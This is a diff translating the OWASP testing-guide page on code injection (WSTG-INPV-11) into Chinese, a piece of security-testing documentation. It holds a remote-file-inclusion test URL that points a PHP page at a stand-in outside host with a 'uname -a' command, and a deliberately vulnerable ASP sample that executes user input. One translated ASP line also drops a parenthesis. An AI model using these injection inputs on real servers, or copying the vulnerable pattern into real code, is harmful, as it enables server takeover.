@@ -1,52 +1,52 @@
-# Testing for Code Injection
+# 测试代码注入
 
 |ID          |
 |------------|
 |WSTG-INPV-11|
 
-## Summary
+## 概述
 
-This section describes how a tester can check if it is possible to enter code as input on a web page and have it executed by the web server.
+本节描述测试人员如何检查是否有可能在Web页面上输入代码作为输入并由Web服务器执行。
 
-In [Code Injection](https://owasp.org/www-community/attacks/Code_Injection) testing, a tester submits input that is processed by the web server as dynamic code or as an included file. These tests can target various server-side scripting engines, e.g., ASP or PHP. Proper input validation and secure coding practices need to be employed to protect against these attacks.
+在[代码注入](https://owasp.org/www-community/attacks/Code_Injection)测试中，测试人员提交被Web服务器作为动态代码或包含文件处理的输入。这些测试可以针对各种服务器端脚本引擎，例如ASP或PHP。需要适当的输入验证和安全编码实践来防御这些攻击。
 
-## Test Objectives
+## 测试目标
 
-- Identify injection points where you can inject code into the application.
-- Assess the injection severity.
+- 识别可以向应用程序注入代码的注入点。
+- 评估注入严重程度。
 
-## How to Test
+## 如何测试
 
-### Black-Box Testing
+### 黑盒测试
 
-#### Testing for PHP Injection Vulnerabilities
+#### 测试PHP注入漏洞
 
-Using the querystring, the tester can inject code (in this example, a malicious URL) to be processed as part of the included file:
+使用querystring，测试人员可以注入代码（在此示例中为恶意URL）以作为包含文件的一部分进行处理：
 
 `https://www.example.com/uptime.php?pin=https://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a`
 
-> The malicious URL is accepted as a parameter for the PHP page, which will later use the value in an included file.
+> 恶意URL被接受为PHP页面的参数，该参数随后将在包含文件中使用该值。
 
-### Gray-Box Testing
+### 灰盒测试
 
-#### Testing for ASP Code Injection Vulnerabilities
+#### 测试ASP代码注入漏洞
 
-Examine ASP code for user input used in execution functions. Can the user enter commands into the Data input field? Here, the ASP code will save the input to a file and then execute it:
+检查用于执行函数的用户输入的ASP代码。用户可以在数据输入字段中输入命令吗？这里，ASP代码将输入保存到文件，然后执行它：
 
 ```asp
 <%
-If not isEmpty(Request( "Data" ) ) Then
-Dim fso, f
-'User input Data is written to a file named data.txt
-Set fso = CreateObject("Scripting.FileSystemObject")
-Set f = fso.OpenTextFile(Server.MapPath( "data.txt" ), 8, True)
-f.Write Request("Data") & vbCrLf
+If not isEmpty(Request( "Data" ) Then
+Dim fso, f
+'User input Data is written to a file named data.txt
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set f = fso.OpenTextFile(Server.MapPath( "data.txt" ), 8, True)
+f.Write Request("Data") & vbCrLf
 f.close
-Set f = nothing
-Set fso = Nothing
+Set f = nothing
+Set fso = Nothing
 
-'Data.txt is executed
-Server.Execute( "data.txt" )
+'Data.txt is executed
+Server.Execute( "data.txt" )
 
 Else
 %>
@@ -56,12 +56,12 @@ Else
 
 </form>
 <%
-End If
-%>)))
+End If
+%>
 ```
 
-### References
+### 参考资料
 
 - [Insecure.org](https://insecure.org/)
-- [Wikipedia](https://www.wikipedia.org)
-- [Reviewing Code for OS Injection](https://wiki.owasp.org/index.php/OS_Injection)
+- [维基百科](https://www.wikipedia.org)
+- [审查代码以防止OS注入](https://wiki.owasp.org/index.php/OS_Injection)
